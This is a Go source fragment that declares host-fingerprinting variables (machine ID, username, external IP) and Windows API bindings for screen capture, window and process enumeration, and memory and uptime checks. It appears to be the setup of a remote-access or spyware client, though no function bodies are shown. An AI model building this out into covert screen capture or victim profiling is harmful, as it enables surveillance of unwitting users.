package main

import (
	"os"
	"path/filepath"
	"strings"
	"syscall"
)

var (
	machineID, _  = GetMachineID()
	machinePrefix = strings.ToUpper(machineID[:3])
	programName   = filepath.Base(os.Args[0])
	username, _   = getDesktopUsername()
	pid           = os.Getpid()
	architecture  = getProgramArchitecture()
	ip, _         = getExternalIP()
)

var (
	gdi32                    = syscall.NewLazyDLL("gdi32.dll")
	user32                   = syscall.NewLazyDLL("user32.dll")
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	procGetDC                = user32.NewProc("GetDC")
	procReleaseDC            = user32.NewProc("ReleaseDC")
	procDeleteDC             = gdi32.NewProc("DeleteDC")
	procBitBlt               = gdi32.NewProc("BitBlt")
	procDeleteObject         = gdi32.NewProc("DeleteObject")
	procSelectObject         = gdi32.NewProc("SelectObject")
	procCreateDIBSection     = gdi32.NewProc("CreateDIBSection")
	procCreateCompatibleDC   = gdi32.NewProc("CreateCompatibleDC")
	procGetDeviceCaps        = gdi32.NewProc("GetDeviceCaps")
	procGetLastError         = kernel32.NewProc("GetLastError")
	globalMemoryStatusEx     = kernel32.NewProc("GlobalMemoryStatusEx")
	procGetTickCount64       = kernel32.NewProc("GetTickCount64")
	enumWindows              = user32.NewProc("EnumWindows")
	isWindowVisible          = user32.NewProc("IsWindowVisible")
	getWindowTextW           = user32.NewProc("GetWindowTextW")
	getWindowTextLen         = user32.NewProc("GetWindowTextLengthW")
	CreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	Process32First           = kernel32.NewProc("Process32FirstW")
	Process32Next            = kernel32.NewProc("Process32NextW")
	CloseHandle              = kernel32.NewProc("CloseHandle")
)
